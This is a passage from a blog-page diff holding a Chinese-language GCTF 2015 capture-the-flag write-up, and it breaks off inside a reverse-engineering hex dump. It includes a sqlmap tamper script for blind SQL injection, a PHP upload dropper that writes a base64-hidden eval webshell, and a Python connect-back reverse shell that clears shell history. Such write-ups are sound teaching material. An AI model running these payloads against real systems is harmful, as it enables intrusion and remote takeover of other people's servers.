@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="en"><head><style>:where(img){height:auto;width:auto}</style>
+    <meta charset="UTF-8">
+    <meta content="width=device-width" name="viewport">
+    <link href="/favicon.svg" rel="icon" type="image/svg+xml">
+    <link href="https://blog.sakanano.moe/posts/archive_gctf2015_writeup/" rel="canonical">
+    <meta content="Astro v2.4.5" name="generator">
+
+    <!-- General Meta Tags -->
+    <title>gctf2015-writeup</title>
+    <meta content="gctf2015-writeup" name="title">
+    <meta content="Already Archive Before 20230604" name="description">
+    <meta content="lc4t" name="author">
+    <link href="/sitemap-index.xml" rel="sitemap">
+
+    <!-- Open Graph / Facebook -->
+    <meta content="gctf2015-writeup" property="og:title">
+    <meta content="Already Archive Before 20230604" property="og:description">
+    <meta content="https://blog.sakanano.moe/posts/archive_gctf2015_writeup/" property="og:url">
+    <meta content="https://blog.sakanano.moe/gctf2015-writeup.png" property="og:image">
+
+    <!-- Twitter -->
+    <meta content="summary_large_image" property="twitter:card">
+    <meta content="https://blog.sakanano.moe/posts/archive_gctf2015_writeup/" property="twitter:url">
+    <meta content="gctf2015-writeup" property="twitter:title">
+    <meta content="Already Archive Before 20230604" property="twitter:description">
+    <meta content="https://blog.sakanano.moe/gctf2015-writeup.png" property="twitter:image">
+
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com" rel="preconnect">
+    <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400;1,600&amp;display=swap" rel="stylesheet">
+
+    
+
+    <script src="/toggle-theme.js"></script>
+  <link href="/_astro/404.03f57927.css" rel="stylesheet">
+<link href="/_astro/about.ace74c2a.css" rel="stylesheet">
+<link href="/_astro/about.6e6daff0.css" rel="stylesheet">
+<link href="/_astro/_slug_.40cf44c5.css" rel="stylesheet">
+<link href="/_astro/_slug_.41a32359.css" rel="stylesheet">
+<link href="/_astro/about.18333935.css" rel="stylesheet">
+<link href="/_astro/about.34388b73.css" rel="stylesheet">
+<link href="/_astro/_slug_.3b14054e.css" rel="stylesheet">
+<link href="/_astro/_slug_.906d67ca.css" rel="stylesheet"><script type="module">const e=document.querySelector(".hamburger-menu"),n=document.querySelector(".menu-icon"),u=document.querySelector("#menu-items");e?.addEventListener("click",()=>{let t="true"===e.getAttribute("aria-expanded");n?.classList.toggle("is-active"),e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"Open Menu":"Close Menu"),u?.classList.toggle("display-none")});</script></head>
+  <body>
+    
+  <header class="astro-3EF6KSR2">
+  <a class="astro-3EF6KSR2" href="#main-content" id="skip-to-content">Skip to content</a>
+  <div class="astro-3EF6KSR2 nav-container">
+    <div class="astro-3EF6KSR2 top-nav-wrap">
+      <a class="astro-3EF6KSR2 logo" href="/">
+        鱼の
+      </a>
+      <nav class="astro-3EF6KSR2" id="nav-menu">
+        <button class="astro-3EF6KSR2 focus-outline hamburger-menu" aria-label="Open Menu" aria-controls="menu-items" aria-expanded="false">
+          <svg class="astro-3EF6KSR2 menu-icon" xmlns="http://www.w3.org/2000/svg" stroke-linecap="round" stroke-linejoin="round" fill="none" height="24" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" width="24">
+            <line class="line astro-3EF6KSR2" x1="7" x2="21" y1="12" y2="12"></line>
+            <line class="line astro-3EF6KSR2" x1="3" x2="21" y1="6" y2="6"></line>
+            <line class="line astro-3EF6KSR2" x1="12" x2="21" y1="18" y2="18"></line>
+            <line class="astro-3EF6KSR2 close" x1="18" x2="6" y1="6" y2="18"></line>
+            <line class="astro-3EF6KSR2 close" x1="6" x2="18" y1="6" y2="18"></line>
+          </svg>
+        </button>
+        <ul class="astro-3EF6KSR2 display-none sm:flex" id="menu-items">
+          <li class="astro-3EF6KSR2">
+            <a class="astro-3EF6KSR2" href="/posts">
+              Posts
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a class="astro-3EF6KSR2" href="/tags">
+              Tags
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a class="astro-3EF6KSR2" href="/about">
+              About
+            </a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <a class="astro-3EF6KSR2 focus-outline astro-5EUNQZKT group inline-block p-3 sm:p-1" href="/search" tabindex="0" title="Search" aria-label="search">
+  
+              <svg class="astro-3EF6KSR2 scale-125 sm:scale-100" xmlns="http://www.w3.org/2000/svg"><path d="M19.023 16.977a35.13 35.13 0 0 1-1.367-1.384c-.372-.378-.596-.653-.596-.653l-2.8-1.337A6.962 6.962 0 0 0 16 9c0-3.859-3.14-7-7-7S2 5.141 2 9s3.14 7 7 7c1.763 0 3.37-.66 4.603-1.739l1.337 2.8s.275.224.653.596c.387.363.896.854 1.384 1.367l1.358 1.392.604.646 2.121-2.121-.646-.604c-.379-.372-.885-.866-1.391-1.36zM9 14c-2.757 0-5-2.243-5-5s2.243-5 5-5 5 2.243 5 5-2.243 5-5 5z" class="astro-3EF6KSR2"></path>
+              </svg>
+            
+</a>
+          </li>
+          <li class="astro-3EF6KSR2">
+            <button class="astro-3EF6KSR2 focus-outline" aria-label="auto" aria-live="polite" id="theme-btn" title="Toggles light &amp; dark">
+                  <svg class="astro-3EF6KSR2" xmlns="http://www.w3.org/2000/svg" id="moon-svg">
+                    <path d="M20.742 13.045a8.088 8.088 0 0 1-2.077.271c-2.135 0-4.14-.83-5.646-2.336a8.025 8.025 0 0 1-2.064-7.723A1 1 0 0 0 9.73 2.034a10.014 10.014 0 0 0-4.489 2.582c-3.898 3.898-3.898 10.243 0 14.143a9.937 9.937 0 0 0 7.072 2.93 9.93 9.93 0 0 0 7.07-2.929 10.007 10.007 0 0 0 2.583-4.491 1.001 1.001 0 0 0-1.224-1.224zm-2.772 4.301a7.947 7.947 0 0 1-5.656 2.343 7.953 7.953 0 0 1-5.658-2.344c-3.118-3.119-3.118-8.195 0-11.314a7.923 7.923 0 0 1 2.06-1.483 10.027 10.027 0 0 0 2.89 7.848 9.972 9.972 0 0 0 7.848 2.891 8.036 8.036 0 0 1-1.484 2.059z" class="astro-3EF6KSR2"></path>
+                  </svg>
+                  <svg class="astro-3EF6KSR2" xmlns="http://www.w3.org/2000/svg" id="sun-svg">
+                    <path d="M6.993 12c0 2.761 2.246 5.007 5.007 5.007s5.007-2.246 5.007-5.007S14.761 6.993 12 6.993 6.993 9.239 6.993 12zM12 8.993c1.658 0 3.007 1.349 3.007 3.007S13.658 15.007 12 15.007 8.993 13.658 8.993 12 10.342 8.993 12 8.993zM10.998 19h2v3h-2zm0-17h2v3h-2zm-9 9h3v2h-3zm17 0h3v2h-3zM4.219 18.363l2.12-2.122 1.415 1.414-2.12 2.122zM16.24 6.344l2.122-2.122 1.414 1.414-2.122 2.122zM6.342 7.759 4.22 5.637l1.415-1.414 2.12 2.122zm13.434 10.605-1.414 1.414-2.122-2.122 1.414-1.414z" class="astro-3EF6KSR2"></path>
+                  </svg>
+                </button>
+          </li>
+        </ul>
+      </nav>
+    </div>
+  </div>
+  <div class="max-w-3xl mx-auto px-4">
+  <hr aria-hidden="true" class="border-skin-line">
+</div>
+</header>
+  <div class="astro-VJ4TPSPI flex justify-start max-w-3xl mx-auto px-2 w-full">
+    <button class="astro-VJ4TPSPI flex focus-outline hover:opacity-75 mb-2 mt-8" onclick="history.back()">
+      <svg class="astro-VJ4TPSPI" xmlns="http://www.w3.org/2000/svg"><path d="M13.293 6.293 7.586 12l5.707 5.707 1.414-1.414L10.414 12l4.293-4.293z" class="astro-VJ4TPSPI"></path>
+      </svg><span class="astro-VJ4TPSPI">Go back</span>
+    </button>
+  </div>
+  <main class="astro-VJ4TPSPI" id="main-content">
+    <h1 class="astro-VJ4TPSPI post-title">gctf2015-writeup</h1>
+    <div class="astro-VJ4TPSPI flex items-center my-2 opacity-80 space-x-2" data-hk="0-0"><svg class="inline-block fill-skin-base h-6 scale-100 w-6" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M7 11h2v2H7zm0 4h2v2H7zm4-4h2v2h-2zm0 4h2v2h-2zm4-4h2v2h-2zm0 4h2v2h-2z"></path><path d="M5 22h14c1.103 0 2-.897 2-2V6c0-1.103-.897-2-2-2h-2V2h-2v2H9V2H7v2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2zM19 8l.001 12H5V8h14z"></path></svg><span class="sr-only">Posted on:</span><span class="italic text-base">2015年10月3日<span data-hk="0-1-0" aria-hidden="true"> | </span><span class="sr-only" data-hk="0-1-1">&nbsp;at&nbsp;</span>08:45</span></div>
+    <article class="astro-VJ4TPSPI max-w-3xl mx-auto mt-8 prose" id="article" role="article">
+      <h2 id="gctf-writeup-by-cnss">gctf writeup, by cnss</h2>
+<h3 id="web200">WEB200</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">先吐槽，第一天做的时候web100表里面居然flag字段为空，就以为是个坑，到处翻表，结果是被人搅了而已，那么卡的服务器居然出的是时间盲注真是醉了。</span></span>
+<span class="line"><span style="color:#abb2bf">当url中出现大写的PG_SLEEP的时候就会返回can’t use sleep，测试小写的时候发现可以成功sleep并不拦截。因此写个tamper用sqlmap跑，tamper代码如下：</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">dependencies</span><span style="color:#abb2bf">():</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#c678dd;font-style:italic">pass</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">tamper</span><span style="color:#abb2bf">(</span><span style="color:#d19a66;font-style:italic">payload</span><span style="color:#abb2bf">, **</span><span style="color:#d19a66;font-style:italic">kwargs</span><span style="color:#abb2bf">):</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">    retVal </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> payload.</span><span style="color:#61afef">replace</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"PG_SLEEP"</span><span style="color:#abb2bf">,</span><span style="color:#98c379">"pg_sleep"</span><span style="color:#abb2bf">)</span><span style="color:#fff">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">return</span><span style="color:#abb2bf"> retVal</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">sqlmap的关键参数是 --tamper xxx.py --technique T --dbms postgresql –D public –T web100 --dump  在flag字段注入出flag。</span></span></code></pre>
+<h3 id="web300">WEB300</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">Hint说会被立刻删除，因此写个php写上上级目录，放进zip中，用burp一直跑对应用户名的上传目录即可。php代码如下：</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#56b6c2">&lt;</span><span style="color:#abb2bf"> </span><span style="color:#c678dd">?</span><span style="color:#abb2bf">php</span></span>
+<span class="line"><span style="color:#e06c75">$dir</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">dirname</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">__FILE__</span><span style="color:#abb2bf">);</span></span>
+<span class="line"><span style="color:#e06c75">$basedir</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#e06c75">$dir</span><span style="color:#abb2bf">.</span><span style="color:#98c379">"/../../"</span><span style="color:#abb2bf">;</span></span>
+<span class="line"><span style="color:#56b6c2">system</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"chmod -Rf 777 "</span><span style="color:#abb2bf">.</span><span style="color:#e06c75">$basedir</span><span style="color:#abb2bf">); </span><span style="color:#7f848e;font-style:italic">//由于目录权限被搅，还要把权限设置回来</span></span>
+<span class="line"><span style="color:#56b6c2">echo</span><span style="color:#abb2bf"> </span><span style="color:#e06c75">$basedir</span><span style="color:#abb2bf">;</span></span>
+<span class="line"><span style="color:#56b6c2">echo</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">file_put_contents</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"../../luoisyourfather.php"</span><span style="color:#abb2bf">,</span><span style="color:#56b6c2">base64_decode</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"DQo8P3BocCANCmlmKG1kNSgkX0dFVFsneCddKSA9PSAiZTNiN2QzZjgyM2VhODJkMmY2M2FkM2JiZmQwN2I0ZmMiKXsNCiAgICBldmFsKCRfUE9TVFsnbHVvJ10pOyANCn0NCj8+"</span><span style="color:#abb2bf">));</span></span>
+<span class="line"><span style="color:#c678dd">?</span><span style="color:#56b6c2">&gt;</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">本人上传的用户名为testluo，文件名为3.php因此burp一直get /uploads/testluo/3.php，出现200状态码即可</span></span>
+<span class="line"><span style="color:#abb2bf">成功拿到shell后在网站根目录的fl4g文件夹下发现flag。(然后就可以写脚本搅屎了)</span></span></code></pre>
+<h3 id="web500">WEB500</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">两种办法，可以用portmap把22转发出来用ssh，另一个用python写一个tty的shell反弹出来。我选择python的ttyshell，因为ssh猜密码很麻烦。Python代码如下：</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#7f848e;font-style:italic">#!/usr/bin/python</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> sys</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> os</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> socket</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">import</span><span style="color:#abb2bf"> pty</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">shell </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"/bin/sh"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">usage</span><span style="color:#abb2bf">(</span><span style="color:#d19a66;font-style:italic">programname</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#56b6c2">print</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"python connect-back door"</span></span>
+<span class="line"><span style="color:#56b6c2">print</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"Usage: </span><span style="color:#d19a66">%s</span><span style="color:#98c379"> &lt;conn_back_ip&gt; &lt;port&gt;"</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">%</span><span style="color:#abb2bf"> programname</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">main</span><span style="color:#abb2bf">():</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">len</span><span style="color:#abb2bf">(sys.argv) </span><span style="color:#56b6c2">!=</span><span style="color:#d19a66">3</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#61afef">usage</span><span style="color:#abb2bf">(sys.argv[</span><span style="color:#d19a66">0</span><span style="color:#abb2bf">])</span></span>
+<span class="line"><span style="color:#abb2bf">sys.</span><span style="color:#61afef">exit</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">1</span><span style="color:#abb2bf">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">s </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> socket.</span><span style="color:#61afef">socket</span><span style="color:#abb2bf">(socket.</span><span style="color:#d19a66">AF_INET</span><span style="color:#abb2bf">,socket.</span><span style="color:#d19a66">SOCK_STREAM</span><span style="color:#abb2bf">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">try</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#abb2bf">s.</span><span style="color:#61afef">connect</span><span style="color:#abb2bf">((socket.</span><span style="color:#61afef">gethostbyname</span><span style="color:#abb2bf">(sys.argv[</span><span style="color:#d19a66">1</span><span style="color:#abb2bf">]),</span><span style="color:#56b6c2">int</span><span style="color:#abb2bf">(sys.argv[</span><span style="color:#d19a66">2</span><span style="color:#abb2bf">])))</span></span>
+<span class="line"><span style="color:#56b6c2">print</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"[+]Connect OK."</span></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">except</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#56b6c2">print</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"[-]Cant connect"</span></span>
+<span class="line"><span style="color:#abb2bf">sys.</span><span style="color:#61afef">exit</span><span style="color:#abb2bf">(</span><span style="color:#d19a66">2</span><span style="color:#abb2bf">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">os.</span><span style="color:#61afef">dup2</span><span style="color:#abb2bf">(s.</span><span style="color:#61afef">fileno</span><span style="color:#abb2bf">(),</span><span style="color:#d19a66">0</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">os.</span><span style="color:#61afef">dup2</span><span style="color:#abb2bf">(s.</span><span style="color:#61afef">fileno</span><span style="color:#abb2bf">(),</span><span style="color:#d19a66">1</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">os.</span><span style="color:#61afef">dup2</span><span style="color:#abb2bf">(s.</span><span style="color:#61afef">fileno</span><span style="color:#abb2bf">(),</span><span style="color:#d19a66">2</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#c678dd">global</span><span style="color:#abb2bf"> shell</span></span>
+<span class="line"><span style="color:#abb2bf">os.</span><span style="color:#61afef">unsetenv</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"HISTFILE"</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">os.</span><span style="color:#61afef">unsetenv</span><span style="color:#abb2bf">(</span><span style="color:#98c379">"HISTFILESIZE"</span><span style="color:#abb2bf">)</span></span>
+<span class="line"><span style="color:#abb2bf">pty.</span><span style="color:#61afef">spawn</span><span style="color:#abb2bf">(shell)</span></span>
+<span class="line"><span style="color:#abb2bf">s.</span><span style="color:#61afef">close</span><span style="color:#abb2bf">()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> </span><span style="color:#e06c75">__name__</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">==</span><span style="color:#abb2bf"> </span><span style="color:#98c379">"__main__"</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#61afef">main</span><span style="color:#abb2bf">()</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">弹出来shell后直接su redrain，密码为弱口令asd123!@#，在/home/redrain下发现flag</span></span></code></pre>
+<h3 id="misc-50">Misc 50</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">网页源码里 aaencode的代码,运行,出来一个gctf{}，以为少了东西,找了半天提交了一下居然对了..</span></span></code></pre>
+<h3 id="misc100">Misc100</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">递归查{} 注意从源码复制和嵌套,爆破也可以，脚本跑出来一直是267，不对( ⊙ o ⊙ )啊！</span></span>
+<span class="line"><span style="color:#abb2bf">默默+1 -1 发现266对了</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#7f848e;font-style:italic">#-*-coding:utf-8-*-</span></span>
+<span class="line"><span style="color:#c678dd">def</span><span style="color:#abb2bf"> </span><span style="color:#61afef">Count</span><span style="color:#abb2bf">():</span></span>
+<span class="line"><span style="color:#abb2bf">    s </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'''the string without </span><span style="color:#56b6c2">\\</span><span style="color:#98c379">'''</span></span>
+<span class="line"><span style="color:#abb2bf">    cnt </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">0</span></span>
+<span class="line"><span style="color:#abb2bf">    left </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">0</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> s:</span></span>
+<span class="line"><span style="color:#abb2bf">        </span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> i </span><span style="color:#56b6c2">==</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'{'</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#abb2bf">            left </span><span style="color:#56b6c2">+=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">1</span></span>
+<span class="line"><span style="color:#abb2bf">        </span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> i </span><span style="color:#56b6c2">==</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'}'</span><span style="color:#abb2bf">:</span></span>
+<span class="line"><span style="color:#abb2bf">            </span><span style="color:#c678dd;font-style:italic">if</span><span style="color:#abb2bf"> (left </span><span style="color:#56b6c2">&gt;</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">0</span><span style="color:#abb2bf">):</span></span>
+<span class="line"><span style="color:#abb2bf">                left </span><span style="color:#56b6c2">-=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">1</span></span>
+<span class="line"><span style="color:#abb2bf">                cnt </span><span style="color:#56b6c2">+=</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">1</span></span>
+<span class="line"><span style="color:#abb2bf">    </span><span style="color:#56b6c2">print</span><span style="color:#abb2bf"> cnt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#61afef">Count</span><span style="color:#abb2bf">()</span></span></code></pre>
+<h3 id="misc200600">Misc200/600</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">http://insight-labs.org/?p=371 分离出来狗</span></span>
+<span class="line"><span style="color:#abb2bf">LSB在CSDN上有个工具,人家毕业设计 直接跑一下OK出来flag</span></span></code></pre>
+<h3 id="re-1">Re 1:</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">simply Reverse.</span></span>
+<span class="line"><span style="color:#abb2bf">1.py:</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">str1 </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">'62C5J110119120L'</span></span>
+<span class="line"><span style="color:#abb2bf">	str2 </span><span style="color:#56b6c2">=</span><span style="color:#abb2bf"> </span><span style="color:#98c379">''</span></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#c678dd;font-style:italic">for</span><span style="color:#abb2bf"> i </span><span style="color:#c678dd;font-style:italic">in</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">range</span><span style="color:#abb2bf">(</span><span style="color:#56b6c2">len</span><span style="color:#abb2bf">(str1)):</span></span>
+<span class="line"><span style="color:#abb2bf">		str2 </span><span style="color:#56b6c2">+=</span><span style="color:#abb2bf"> </span><span style="color:#56b6c2">chr</span><span style="color:#abb2bf">(</span><span style="color:#56b6c2">ord</span><span style="color:#abb2bf">(str1[i]) </span><span style="color:#56b6c2">+</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">49</span><span style="color:#abb2bf"> )</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#abb2bf">	</span><span style="color:#56b6c2">print</span><span style="color:#abb2bf"> str2</span></span></code></pre>
+<h3 id="re2">Re2:</h3>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#abb2bf">a interesting Reverse, use SEH to control execute process.</span></span>
+<span class="line"><span style="color:#abb2bf">breakpoint in SEH process function(0x401000) and then trigger off a exception.</span></span>
+<span class="line"><span style="color:#abb2bf"></span></span>
+<span class="line"><span style="color:#abb2bf">there is a simply labyrinth.</span></span></code></pre>
+<pre class="astro-code one-dark-pro" is:raw="" style="white-space:pre-wrap;word-wrap:break-word;background-color:#282c34;overflow-x:auto" tabindex="0"><code><span class="line"><span style="color:#61afef">00409036</span><span style="color:#abb2bf">  </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf">  </span><span style="color:#e5c07b">***</span><span style="color:#abb2bf">  </span><span style="color:#e5c07b">**</span><span style="color:#abb2bf">  </span><span style="color:#e5c07b">**</span><span style="color:#abb2bf"> </span><span style="color:#e5c07b">****</span></span>
+<span class="line"><span style="color:#61afef">00409046</span><span style="color:#abb2bf">  </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">2</span><span style="color:#98c379">A</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">23</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf"> </span><span style="color:#d19a66">20</span><span style="color:#abb2bf">   </span><span style="color:#e5c07b">**</span><span style="color:#abb2bf"> </span><span style="color:#e5c07b">*******</span><span style="color:#abb2bf"> </span><span style="color:#e5c07b">*</span><span style="color:#98c379">#</span></span>
